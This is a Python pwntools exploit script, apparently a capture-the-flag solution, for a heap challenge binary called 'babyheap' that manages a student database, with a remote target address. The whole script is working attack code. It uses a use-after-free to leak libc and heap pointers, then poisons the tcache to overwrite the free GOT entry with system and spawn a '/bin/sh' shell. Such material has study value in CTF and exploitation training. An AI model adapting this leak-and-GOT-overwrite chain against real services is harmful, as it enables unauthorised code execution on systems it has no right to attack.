#!/usr/bin/env python3

from pwn import *

e = ELF("./babyheap")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e

gs = """b* main+132
c
"""

if args.REMOTE:
    p = remote("13.212.34.169", 31143)
else:
    p = process([e.path])

if args.GDB:
    gdb.attach(p,gs)

def add_student(id, len, name):
    p.sendlineafter(b"Enter your choice: ", b"1")
    p.sendlineafter(b"database: ", str(id).encode())
    p.sendlineafter(b"name: ", str(len).encode())
    p.sendafter(b"Enter the name: ", name)

def show_student(id):
    p.sendlineafter(b"Enter your choice: ", b"2")
    p.sendlineafter(b"ID: ", str(id).encode())

def del_student(id):
    p.sendlineafter(b"Enter your choice: ", b"3")
    p.sendlineafter(b"ID: ", str(id).encode())

add_student(0, 0x500, b"A"*0x10)
add_student(1, 0x20, b"AAA")
del_student(0)
show_student(0)
leak = u64(p.recvuntil(b"\x7f").ljust(8, b"\x00"))
libc.address = leak - 2202848
log.info("Libc: 0x{:x}".format(libc.address))
del_student(1)
show_student(1)
heap = u64(p.recvn(2).ljust(8, b"\x00"))
log.info("Heap: 0x{:x}".format(heap))

add_student(6, 0x40, b"AAA")
add_student(7, 0x40, b"AAA")
del_student(7)
del_student(6)
add_student(6, 0x40, p64((e.got["free"] - 8) ^ heap))
add_student(8, 0x40, b"hahahah")
add_student(9, 0x40, p64(libc.sym["system"])*2)
add_student(10, 0x40, b"/bin/sh\x00")
# input()
del_student(10)
p.interactive()